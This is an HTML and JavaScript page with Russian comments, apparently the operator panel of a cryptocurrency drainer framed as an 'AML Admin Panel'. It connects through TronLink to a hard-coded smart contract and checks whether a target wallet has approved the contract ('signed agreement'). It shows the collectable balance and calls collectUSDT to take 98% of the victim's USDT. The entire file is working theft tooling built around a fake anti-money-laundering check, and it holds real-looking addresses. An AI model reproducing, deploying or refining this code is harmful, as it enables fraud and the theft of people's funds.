<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AML Admin - Collect Funds</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #0B0E11;
            color: #fff;
            padding: 20px;
            max-width: 600px;
            margin: 0 auto;
        }
        h1 { color: #00D4AA; margin-bottom: 20px; }
        .card {
            background: #151A21;
            border: 1px solid #2D333B;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            background: #1C2128;
            border: 1px solid #2D333B;
            border-radius: 8px;
            color: #fff;
            margin-bottom: 10px;
            font-size: 14px;
        }
        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #3375BB 0%, #00D4AA 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            font-size: 16px;
        }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        .status {
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            font-size: 14px;
            display: none;
        }
        .status.success { background: rgba(0, 212, 170, 0.1); border: 1px solid #00D4AA; display: block; }
        .status.error { background: rgba(255, 71, 87, 0.1); border: 1px solid #ff4757; display: block; }
        .status.info { background: rgba(51, 117, 187, 0.1); border: 1px solid #3375BB; display: block; }
        .amount { font-size: 24px; font-weight: 700; color: #00D4AA; margin: 10px 0; }
    </style>
</head>
<body>
    <h1>🔐 AML Admin Panel</h1>
    
    <div class="card">
        <h3>Collect USDT from User</h3>
        <input type="text" id="userAddress" placeholder="User Address (T...)" value="TM84hjZ28XRw13oHAWWsGnf54mUSHVVDtN">
        <input type="text" id="usdtAddress" placeholder="USDT Contract" value="TFNJbhLpxBmU393Rqd9Ggjgx9eoBsNLqhb">
        
        <button onclick="checkCollectable()" id="checkBtn">Check Available Amount</button>
        
        <div id="checkResult" style="margin-top: 15px;"></div>
        
        <button onclick="collectFunds()" id="collectBtn" style="margin-top: 10px; display: none;">
            Collect 98% USDT
        </button>
        
        <div id="status" class="status"></div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.min.js"></script>
    <script>
        const CONTRACT_ADDRESS = 'TBBMuPA1DuUHFXFPMR4Ybq1CtTEh5i4EX2'; // Замените на V7 после деплоя
        
        const CONTRACT_ABI = [
            {"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"usdt","type":"address"}],"name":"checkCollectable","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"usdt","type":"address"}],"name":"collectUSDT","outputs":[],"stateMutability":"nonpayable","type":"function"},
            {"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"approved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"isReadyToCollect","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
            {"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}
        ];

        let tronWeb, contract, userAddress;

        async function init() {
            if (!window.tronWeb) {
                alert('Please open in TronLink');
                return;
            }
            
            tronWeb = window.tronWeb;
            userAddress = tronWeb.defaultAddress.base58;
            contract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
            
            // Проверяем что мы владелец
            const owner = await contract.owner().call();
            if (owner !== userAddress) {
                alert('You are not the contract owner!');
            }
        }

        async function checkCollectable() {
            const user = document.getElementById('userAddress').value.trim();
            const usdt = document.getElementById('usdtAddress').value.trim();
            const resultDiv = document.getElementById('checkResult');
            const collectBtn = document.getElementById('collectBtn');
            
            try {
                // Проверяем подписал ли
                const approved = await contract.approved(user).call();
                if (!approved) {
                    resultDiv.innerHTML = '<div class="status error">User has NOT signed agreement yet</div>';
                    collectBtn.style.display = 'none';
                    return;
                }
                
                // Проверяем сколько можно собрать
                const amount = await contract.checkCollectable(user, usdt).call();
                const amountFormatted = (amount / 1e6).toFixed(2); // USDT имеет 6 decimals
                
                if (amount > 0) {
                    resultDiv.innerHTML = `
                        <div class="status success">
                            Ready to collect!<br>
                            <div class="amount">${amountFormatted} USDT</div>
                            User has approved and signed.
                        </div>
                    `;
                    collectBtn.style.display = 'block';
                    collectBtn.dataset.amount = amount;
                } else {
                    resultDiv.innerHTML = '<div class="status error">No USDT available or no approve</div>';
                    collectBtn.style.display = 'none';
                }
                
            } catch (e) {
                resultDiv.innerHTML = `<div class="status error">Error: ${e.message}</div>`;
            }
        }

        async function collectFunds() {
            const user = document.getElementById('userAddress').value.trim();
            const usdt = document.getElementById('usdtAddress').value.trim();
            const btn = document.getElementById('collectBtn');
            const status = document.getElementById('status');
            
            btn.disabled = true;
            btn.innerHTML = 'Collecting...';
            
            try {
                const tx = await contract.collectUSDT(user, usdt).send({
                    feeLimit: 100000000,
                    callValue: 0
                });
                
                status.innerHTML = `<div class="status success">✅ Collected! TX: ${tx.slice(0, 30)}...</div>`;
                btn.innerHTML = 'Collected';
                
            } catch (e) {
                status.innerHTML = `<div class="status error">❌ ${e.message}</div>`;
                btn.disabled = false;
                btn.innerHTML = 'Collect 98% USDT';
            }
        }

        window.addEventListener('load', init);
    </script>
</body>
</html>
